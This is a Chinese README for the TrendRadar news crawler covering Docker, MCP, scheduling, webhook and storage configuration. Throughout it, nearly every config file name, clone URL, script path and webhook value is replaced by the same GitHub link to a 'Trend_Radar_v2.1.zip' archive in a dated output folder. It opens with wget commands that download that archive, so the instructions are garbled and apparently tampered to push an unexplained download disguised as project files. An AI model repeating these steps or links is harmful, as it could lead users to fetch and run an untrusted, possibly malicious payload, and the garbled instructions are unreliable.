   wget https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip  -P docker/
   wget https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip  -P docker/
   ```

   > 💡 **说明**：Docker 部署需要的关键目录结构如下：
```
当前目录/
├── config/
│   ├── https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
│   └── https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
└── docker/
    ├── .env
    └── https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
```

2. **配置文件说明**:
   - `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` - 应用主配置（报告模式、推送设置等）
   - `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` - 关键词配置（设置你关心的热点词汇）
   - `.env` - 环境变量配置（webhook URLs 和定时任务）

   **⚙️ 环境变量覆盖机制（v3.0.5+）**

   如果你在 NAS 或其他 Docker 环境中遇到**修改 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 后配置不生效**的问题，可以通过环境变量直接覆盖配置：

   | 环境变量 | 对应配置 | 示例值 | 说明 |
   |---------|---------|-------|------|
   | `ENABLE_CRAWLER` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `true` / `false` | 是否启用爬虫 |
   | `ENABLE_NOTIFICATION` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `true` / `false` | 是否启用通知 |
   | `REPORT_MODE` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `daily` / `incremental` / `current`| 报告模式 |
   | `MAX_ACCOUNTS_PER_CHANNEL` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `3` | 每个渠道最大账号数 |
   | `PUSH_WINDOW_ENABLED` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `true` / `false` | 推送时间窗口开关 |
   | `PUSH_WINDOW_START` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `08:00` | 推送开始时间 |
   | `PUSH_WINDOW_END` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `22:00` | 推送结束时间 |
   | `ENABLE_WEBSERVER` | - | `true` / `false` | 是否自动启动 Web 服务器 |
   | `WEBSERVER_PORT` | - | `8080` | Web 服务器端口（默认 8080） |
   | `FEISHU_WEBHOOK_URL` | `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | `https://...` | 飞书 Webhook（支持多账号，用 `;` 分隔） |

   **配置优先级**：环境变量 > https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

   **使用方法**：
   - 修改 `.env` 文件，取消注释并填写需要的配置
   - 或在 NAS/群晖 Docker 管理界面的"环境变量"中直接添加
   - 重启容器后生效：`docker compose up -d`


3. **启动服务**:

   **选项 A：启动所有服务（推送 + AI 分析）**
   ```bash
   # 拉取最新镜像
   docker compose pull

   # 启动所有服务（trend-radar + trend-radar-mcp）
   docker compose up -d
   ```

   **选项 B：仅启动新闻推送服务**
   ```bash
   # 只启动 trend-radar（定时抓取和推送）
   docker compose pull trend-radar
   docker compose up -d trend-radar
   ```

   **选项 C：仅启动 MCP AI 分析服务**
   ```bash
   # 只启动 trend-radar-mcp（提供 AI 分析接口）
   docker compose pull trend-radar-mcp
   docker compose up -d trend-radar-mcp
   ```

   > 💡 **提示**：
   > - 大多数用户只需启动 `trend-radar` 即可实现新闻推送功能
   > - 只有需要使用 Claude/ChatGPT 进行 AI 对话分析时，才需启动 `trend-radar-mcp`
   > - 两个服务相互独立，可根据需求灵活组合

4. **查看运行状态**:
   ```bash
   # 查看新闻推送服务日志
   docker logs -f trend-radar

   # 查看 MCP AI 分析服务日志
   docker logs -f trend-radar-mcp

   # 查看所有容器状态
   docker ps | grep trend-radar

   # 停止特定服务
   docker compose stop trend-radar      # 停止推送服务
   docker compose stop trend-radar-mcp  # 停止 MCP 服务
   ```

#### 方式二：本地构建（开发者选项）

如果需要自定义修改代码或构建自己的镜像：

```bash
# 克隆项目
git clone https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
cd TrendRadar

# 修改配置文件
vim https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
vim https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# 使用构建版本的 docker compose
cd docker
cp https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
```

**构建并启动服务**：

```bash
# 选项 A：构建并启动所有服务
docker compose build
docker compose up -d

# 选项 B：仅构建并启动新闻推送服务
docker compose build trend-radar
docker compose up -d trend-radar

# 选项 C：仅构建并启动 MCP AI 分析服务
docker compose build trend-radar-mcp
docker compose up -d trend-radar-mcp
```

> 💡 **架构参数说明**：
> - 默认构建 `amd64` 架构镜像（适用于大多数 x86_64 服务器）
> - 如需构建 `arm64` 架构（Apple Silicon、树莓派等），设置环境变量：
>   ```bash
>   export DOCKER_ARCH=arm64
>   docker compose build
>   ```

#### 镜像更新

```bash
# 方式一：手动更新（爬虫 + MCP 镜像）
docker pull wantcat/trendradar:latest
docker pull wantcat/trendradar-mcp:latest
docker compose down
docker compose up -d

# 方式二：使用 docker compose 更新
docker compose pull
docker compose up -d
```

**可用镜像**：

| 镜像名称 | 用途 | 说明 |
|---------|------|------|
| `wantcat/trendradar` | 新闻推送服务 | 定时抓取新闻、推送通知 |
| `wantcat/trendradar-mcp` | MCP 服务 | AI 分析功能（可选） |

#### 服务管理命令

```bash
# 查看运行状态
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip status

# 手动执行一次爬虫
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip run

# 查看实时日志
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip logs

# 显示当前配置
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip config

# 显示输出文件
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip files

# Web 服务器管理（用于浏览器访问生成的报告）
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip start_webserver   # 启动 Web 服务器
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip stop_webserver    # 停止 Web 服务器
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip webserver_status  # 查看 Web 服务器状态

# 查看帮助信息
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip help

# 重启容器
docker restart trend-radar

# 停止容器
docker stop trend-radar

# 删除容器（保留数据）
docker rm trend-radar
```

> 💡 **Web 服务器说明**：
> - 启动后可通过浏览器访问 `http://localhost:8080` 查看最新报告
> - 通过目录导航访问历史报告（如：`http://localhost:8080/2025-xx-xx/`）
> - 端口可在 `.env` 文件中配置 `WEBSERVER_PORT` 参数
> - 自动启动：在 `.env` 中设置 `ENABLE_WEBSERVER=true`
> - 安全提示：仅提供静态文件访问，限制在 output 目录，只绑定本地访问

#### 数据持久化

生成的报告和数据默认保存在 `./output` 目录下，即使容器重启或删除，数据也会保留。

**📊 网页版报告访问路径**：

TrendRadar 生成的当日汇总 HTML 报告会同时保存到两个位置：

| 文件位置 | 访问方式 | 适用场景 |
|---------|---------|---------|
| `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 宿主机直接访问 | **Docker 部署**（通过 Volume 挂载，宿主机可见） |
| `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | 根目录访问 | **GitHub Pages**（仓库根目录，Pages 自动识别） |
| `output/YYYY-MM-DD/html/当日汇总.html` | 历史报告访问 | 所有环境（按日期归档） |

**本地访问示例**：
```bash
# 方式 1：通过 Web 服务器访问（推荐，Docker 环境）
# 1. 启动 Web 服务器
docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip start_webserver
# 2. 在浏览器访问
http://localhost:8080                           # 访问最新报告（默认 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip）
http://localhost:8080/2025-xx-xx/               # 访问指定日期的报告
http://localhost:8080/2025-xx-xx/html/          # 浏览该日期下的所有 HTML 文件

# 方式 2：直接打开文件（本地环境）
open https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip             # macOS
start https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip            # Windows
xdg-open https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip         # Linux

# 方式 3：访问历史归档
open ./output/2025-xx-xx/html/当日汇总.html
```

**为什么有两个 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip？**
- `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：Docker Volume 挂载到宿主机，本地可直接打开
- `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：GitHub Actions 推送到仓库，GitHub Pages 自动部署

> 💡 **提示**：两个文件内容完全相同，选择任意一个访问即可。

#### 故障排查

```bash
# 检查容器状态
docker inspect trend-radar

# 查看容器日志
docker logs --tail 100 trend-radar

# 进入容器调试
docker exec -it trend-radar /bin/bash

# 验证配置文件
docker exec -it trend-radar ls -la /app/config/
```

#### MCP 服务部署（AI 分析功能）

如果需要使用 AI 分析功能，可以部署独立的 MCP 服务容器。

**架构说明**：

```mermaid
flowchart TB
    subgraph trend-radar["trend-radar"]
        A1[定时抓取新闻]
        A2[推送通知]
    end
    
    subgraph trend-radar-mcp["trend-radar-mcp"]
        B1[127.0.0.1:3333]
        B2[AI 分析接口]
    end
    
    subgraph shared["共享卷"]
        C1["config/ (ro)"]
        C2["output/ (ro)"]
    end
    
    trend-radar --> shared
    trend-radar-mcp --> shared
```



**快速启动**：

如果已按照 [方式一：使用 docker compose](#方式一使用-docker-compose推荐) 完成部署，只需启动 MCP 服务：

```bash
cd TrendRadar/docker
docker compose up -d trend-radar-mcp

# 查看运行状态
docker ps | grep trend-radar-mcp
```

**单独启动 MCP 服务**（不使用 docker compose）：

```bash
# Linux/Mac
docker run -d --name trend-radar-mcp \
  -p 127.0.0.1:3333:3333 \
  -v $(pwd)/config:/app/config:ro \
  -v $(pwd)/output:/app/output:ro \
  -e TZ=Asia/Shanghai \
  wantcat/trendradar-mcp:latest

# Windows PowerShell
docker run -d --name trend-radar-mcp `
  -p 127.0.0.1:3333:3333 `
  -v ${PWD}/config:/app/config:ro `
  -v ${PWD}/output:/app/output:ro `
  -e TZ=Asia/Shanghai `
  wantcat/trendradar-mcp:latest
```

> ⚠️ **注意**：单独运行时，确保当前目录下有 `config/` 和 `output/` 文件夹，且包含配置文件和新闻数据。

**验证服务**：

```bash
# 检查 MCP 服务健康状态
curl http://127.0.0.1:3333/mcp

# 查看 MCP 服务日志
docker logs -f trend-radar-mcp
```

**在 AI 客户端中配置**：

MCP 服务启动后，根据不同客户端进行配置：

**Cherry Studio**（推荐，GUI 配置）：
- 设置 → MCP 服务器 → 添加
- 类型：`streamableHttp`
- URL：`http://127.0.0.1:3333/mcp`

**Claude Desktop / Cline**（JSON 配置）：
```json
{
  "mcpServers": {
    "trendradar": {
      "url": "http://127.0.0.1:3333/mcp",
      "type": "streamableHttp"
    }
  }
}
```

> 💡 **提示**：MCP 服务仅监听本地端口（127.0.0.1），确保安全性。如需远程访问，请自行配置反向代理和认证。

</details>

### 7. 报告配置

<details>
<summary>👉 点击展开：<strong>报告相关参数配置</strong></summary>
<br>

**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `report` 部分

```yaml
report:
  mode: "daily"                    # 推送模式
  rank_threshold: 5                # 排名高亮阈值
  sort_by_position_first: false    # 排序优先级
  max_news_per_keyword: 0          # 每个关键词最大显示数量
  reverse_content_order: false     # 内容顺序配置
```

#### 配置项详解

| 配置项 | 类型 | 默认值 | 说明 |
|-------|------|-------|------|
| `mode` | string | `daily` | 推送模式，可选 `daily`/`incremental`/`current`，详见 [推送模式详解](#3-推送模式详解) |
| `rank_threshold` | int | `5` | 排名高亮阈值，排名 ≤ 该值的新闻会加粗显示 |
| `sort_by_position_first` | bool | `false` | 排序优先级：`false`=按热点条数排序，`true`=按配置位置排序 |
| `max_news_per_keyword` | int | `0` | 每个关键词最大显示数量，`0`=不限制 |
| `reverse_content_order` | bool | `false` | 内容顺序：`false`=热点词汇统计在前，`true`=新增热点新闻在前 |

#### 内容顺序配置（v3.5.0 新增）

控制推送消息和 HTML 报告中两部分内容的显示顺序：

| 配置值 | 显示顺序 |
|-------|---------|
| `false`（默认） | ① 热点词汇统计 → ② 新增热点新闻 |
| `true` | ① 新增热点新闻 → ② 热点词汇统计 |

**适用场景：**
- `false`（默认）：适合关注关键词匹配结果的用户，先看分类统计
- `true`：适合关注最新动态的用户，优先查看新增热点

**Docker 环境变量：**
```bash
REVERSE_CONTENT_ORDER=true
```

#### 排序优先级配置

**示例场景：** 配置顺序 A、B、C，热点数 A(3条)、B(10条)、C(5条)

| 配置值 | 显示顺序 | 适用场景 |
|-------|---------|---------|
| `false`（默认） | B(10条) → C(5条) → A(3条) | 关注热度趋势 |
| `true` | A(3条) → B(10条) → C(5条) | 关注个人优先级 |

**Docker 环境变量：**
```bash
SORT_BY_POSITION_FIRST=true
MAX_NEWS_PER_KEYWORD=10
```

</details>

### 8. 推送时间窗口配置

<details>
<summary>👉 点击展开：<strong>推送时间窗口控制详解</strong></summary>
<br>

**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 部分

```yaml
notification:
  push_window:
    enabled: false                    # 是否启用
    time_range:
      start: "20:00"                  # 开始时间（北京时间）
      end: "22:00"                    # 结束时间（北京时间）
    once_per_day: true                # 每天只推送一次
```

#### 配置项详解

| 配置项 | 类型 | 默认值 | 说明 |
|-------|------|-------|------|
| `enabled` | bool | `false` | 是否启用推送时间窗口控制 |
| `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | string | `"20:00"` | 推送时间窗口开始时间（北京时间，HH:MM 格式） |
| `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` | string | `"22:00"` | 推送时间窗口结束时间（北京时间，HH:MM 格式） |
| `once_per_day` | bool | `true` | `true`=每天在窗口内只推送一次，`false`=窗口内每次执行都推送 |

#### 使用场景

| 场景 | 配置示例 |
|------|---------|
| **工作时间推送** | `start: "09:00"`, `end: "18:00"`, `once_per_day: false` |
| **晚间汇总推送** | `start: "20:00"`, `end: "22:00"`, `once_per_day: true` |
| **午休时间推送** | `start: "12:00"`, `end: "13:00"`, `once_per_day: true` |

#### 重要提示

> ⚠️ **GitHub Actions 用户注意：**
> - GitHub Actions 执行时间不稳定，可能有 ±15 分钟的偏差
> - 时间范围建议至少留足 **2 小时**
> - 如果想要精准的定时推送，建议使用 **Docker 部署**在个人服务器上

#### Docker 环境变量

```bash
PUSH_WINDOW_ENABLED=true
PUSH_WINDOW_START=09:00
PUSH_WINDOW_END=18:00
PUSH_WINDOW_ONCE_PER_DAY=false
```

#### 完整配置示例

**场景：每天晚上 8-10 点只推送一次汇总**

```yaml
notification:
  push_window:
    enabled: true
    time_range:
      start: "20:00"
      end: "22:00"
    once_per_day: true
```

**场景：工作时间内每小时推送**

```yaml
notification:
  push_window:
    enabled: true
    time_range:
      start: "09:00"
      end: "18:00"
    once_per_day: false
```

</details>

### 9. 执行频率配置

<details>
<summary>👉 点击展开：<strong>自动运行频率设置</strong></summary>
<br>

**配置位置：** `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `schedule` 部分

```yaml
on:
  schedule:
    - cron: "0 * * * *"  # 每小时运行一次
```

#### 什么是 Cron 表达式？

Cron 是一种定时任务格式，由 5 个部分组成：`分 时 日 月 周`

```
┌───────────── 分钟 (0-59)
│ ┌───────────── 小时 (0-23)
│ │ ┌───────────── 日期 (1-31)
│ │ │ ┌───────────── 月份 (1-12)
│ │ │ │ ┌───────────── 星期 (0-6，0=周日)
│ │ │ │ │
* * * * *
```

#### 常用配置示例

| 想要的效果 | Cron 表达式 | 说明 |
|-----------|------------|------|
| 每小时运行 | `0 * * * *` | 每小时的第 0 分钟运行（默认） |
| 每 30 分钟运行 | `*/30 * * * *` | 每隔 30 分钟运行一次 |
| 每天早 8 点运行 | `0 0 * * *` | UTC 0:00 = 北京时间 8:00 |
| 工作时间运行 | `*/30 0-14 * * *` | 北京 8:00-22:00，每 30 分钟 |
| 每天 3 次 | `0 0,6,12 * * *` | 北京 8:00、14:00、20:00 |

#### 重要提示

> ⚠️ **时区注意**：GitHub Actions 使用 **UTC 时间**，北京时间需要 **减 8 小时**
> - 想要北京时间 8:00 运行 → 设置 UTC 0:00
> - 想要北京时间 20:00 运行 → 设置 UTC 12:00

> ⚠️ **频率限制**：GitHub 对每个账号的 Actions 运行次数有限额
> - **建议**：不要设置比 30 分钟更短的间隔
> - **原因**：过于频繁可能被判定为滥用，面临封号风险
> - **实际情况**：GitHub Actions 执行时间本身就有偏差，设置太精确意义不大

#### 修改方法

1. 打开你 fork 的仓库
2. 找到 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件
3. 点击编辑（铅笔图标）
4. 修改 `cron: "0 * * * *"` 中的表达式
5. 点击 "Commit changes" 保存

</details>

### 10. 多账号推送配置

<details>
<summary>👉 点击展开：<strong>多账号推送配置详解</strong></summary>

> ### ⚠️ **安全警告**
> **GitHub Fork 用户请勿在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中配置推送信息！**
>
> - **风险说明**：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 会被提交到公开的 Git 仓库，配置推送信息（Webhook URL、Token 等）会泄露敏感数据
> - **推荐方式**：
>   - **GitHub Actions 用户** → 使用 GitHub Secrets 环境变量
>   - **Docker 用户** → 使用 [`.env` 文件配置](#6-docker-部署)（`.env` 已在 `.gitignore` 中，不会被提交）
> - **本地开发用户**：可以在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中配置（确保不会 push 到公开仓库）

#### 支持的渠道

| 渠道 | 配置项 | 是否需要配对 | 说明 |
|------|--------|-------------|------|
| **飞书** | `feishu_url` | 否 | 多个 webhook URL |
| **钉钉** | `dingtalk_url` | 否 | 多个 webhook URL |
| **企业微信** | `wework_url` | 否 | 多个 webhook URL |
| **Telegram** | `telegram_bot_token` + `telegram_chat_id` | ✅ 是 | token 和 chat_id 数量必须一致 |
| **ntfy** | `ntfy_topic` + `ntfy_token` | ✅ 是 | topic 和 token 数量必须一致（token 可选） |
| **Bark** | `bark_url` | 否 | 多个推送 URL |
| **Slack** | `slack_webhook_url` | 否 | 多个 webhook URL |
| **邮件** | `email_to` | - | 已支持多收件人（逗号分隔），无需修改 |

#### 推荐配置方式 1：GitHub Actions 环境变量

**配置位置**：GitHub Repo → Settings → Secrets and variables → Actions → Repository secrets

**基础配置示例**：
```bash
# 多账号数量限制
MAX_ACCOUNTS_PER_CHANNEL=3

# 飞书多账号（3个群组）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# 钉钉多账号（2个群组）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# 企业微信多账号（2个群组）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# Bark多账号（2个设备）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# Slack多账号（2个频道）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
```

**配对配置示例（Telegram 和 ntfy）**：

<details>
<summary><strong>Telegram 配对配置</strong></summary>

```bash
# ✅ 正确配置：2个token对应2个chat_id
TELEGRAM_BOT_TOKEN=123456:AAA-BBB;789012:CCC-DDD
TELEGRAM_CHAT_ID=-100111;-100222

# ❌ 错误配置：数量不一致，将跳过推送
TELEGRAM_BOT_TOKEN=token1;token2;token3
TELEGRAM_CHAT_ID=id1;id2
```

**说明**：`token` 和 `chat_id` 的数量必须完全一致，否则该渠道推送会被跳过。

</details>

<details>
<summary><strong>ntfy 配对配置</strong></summary>

```bash
# ✅ 正确配置：3个topic，只有第2个需要token
NTFY_TOPIC=topic1;topic2;topic3
NTFY_TOKEN=;token_for_topic2;

# ✅ 正确配置：2个topic都需要token
NTFY_TOPIC=topic1;topic2
NTFY_TOKEN=token1;token2

# ❌ 错误配置：topic和token数量不匹配
NTFY_TOPIC=topic1;topic2
NTFY_TOKEN=token1;token2;token3
```

**说明**：
- 如果某个 topic 不需要 token，在对应位置留空（两个分号之间）
- `topic` 和 `token` 的数量必须一致

</details>

---

#### 推荐配置方式 2：Docker 环境变量（.env）

**配置位置**：项目根目录 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件

**基础配置示例**：
```bash
# 多账号数量限制
MAX_ACCOUNTS_PER_CHANNEL=3

# 飞书多账号（3个群组）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# 钉钉多账号（2个群组）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# 企业微信多账号（2个群组）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# Bark多账号（2个设备）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

# Slack多账号（2个频道）
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
```

**配对配置示例（Telegram 和 ntfy）**：

<details>
<summary><strong>Telegram 配对配置</strong></summary>

```bash
# ✅ 正确配置：2个token对应2个chat_id
TELEGRAM_BOT_TOKEN=123456:AAA-BBB;789012:CCC-DDD
TELEGRAM_CHAT_ID=-100111;-100222

# ❌ 错误配置：数量不一致，将跳过推送
TELEGRAM_BOT_TOKEN=token1;token2;token3
TELEGRAM_CHAT_ID=id1;id2
```

**说明**：`token` 和 `chat_id` 的数量必须完全一致，否则该渠道推送会被跳过。

</details>

<details>
<summary><strong>ntfy 配对配置</strong></summary>

```bash
# ✅ 正确配置：3个topic，只有第2个需要token
NTFY_TOPIC=topic1;topic2;topic3
NTFY_TOKEN=;token_for_topic2;

# ✅ 正确配置：2个topic都需要token
NTFY_TOPIC=topic1;topic2
NTFY_TOKEN=token1;token2

# ❌ 错误配置：topic和token数量不匹配
NTFY_TOPIC=topic1;topic2
NTFY_TOKEN=token1;token2;token3
```

**说明**：
- 如果某个 topic 不需要 token，在对应位置留空（两个分号之间）
- `topic` 和 `token` 的数量必须一致

</details>

---

#### 推送行为说明

1. **独立推送**：每个账号独立发送，一个失败不影响其他账号
2. **部分成功判定**：只要有一个账号发送成功，整体视为成功
3. **日志区分**：多账号时日志会显示"账号1"、"账号2"等标签
4. **批次间隔**：多账号会增加总发送时间（每个账号独立计算批次间隔）

---

#### 常见问题

<details>
<summary><strong>Q1: 超过 3 个账号会怎样？</strong></summary>
<br>

系统会自动截断到配置的最大数量，并输出警告日志。可通过 `max_accounts_per_channel` 调整限制。

**⚠️ GitHub Actions 用户特别注意**：
- **不建议配置过多账号**（建议不超过 3 个），可能导致：
  - **触发 GitHub Actions 速率限制**：频繁的网络请求可能被识别为异常行为
  - **潜在账号风险**：过度使用 GitHub Actions 资源可能影响账号状态

</details>

<details>
<summary><strong>Q2: 多账号会影响推送速度吗？</strong></summary>
<br>

会。每个账号独立发送，总时间 = 账号数 × 单账号发送时间。建议控制账号数量。

</details>

<details>
<summary><strong>Q3: 本地开发用户如何在 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 中配置？</strong></summary>
<br>

如果你是本地开发且**不会将代码推送到公开仓库**，可以直接在 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中配置：

```yaml
notification:
  enable_notification: true
  max_accounts_per_channel: 3

  webhooks:
    feishu_url: "https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip;https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip"
    telegram_bot_token: "token1;token2"
    telegram_chat_id: "id1;id2"
```

**⚠️ 重要提醒**：
- 确保 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 在 `.gitignore` 中（如果会提交代码）
- 或者只在本地开发环境使用，**绝不提交到公开仓库**

</details>

</details>

### 11. 存储配置

<details id="storage-config">
<summary>👉 点击展开：<strong>存储架构配置详解</strong></summary>
<br>

#### 存储后端选择

**配置位置**：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 的 `storage` 部分

v4.0.0 版本重构了存储架构，支持多种存储后端：

```yaml
storage:
  backend: auto  # 存储后端：auto（自动选择）/ local（本地SQLite）/ remote（远程云存储）

  formats:
    sqlite: true   # 是否启用SQLite存储
    txt: true      # 是否生成TXT快照
    html: true     # 是否生成HTML报告

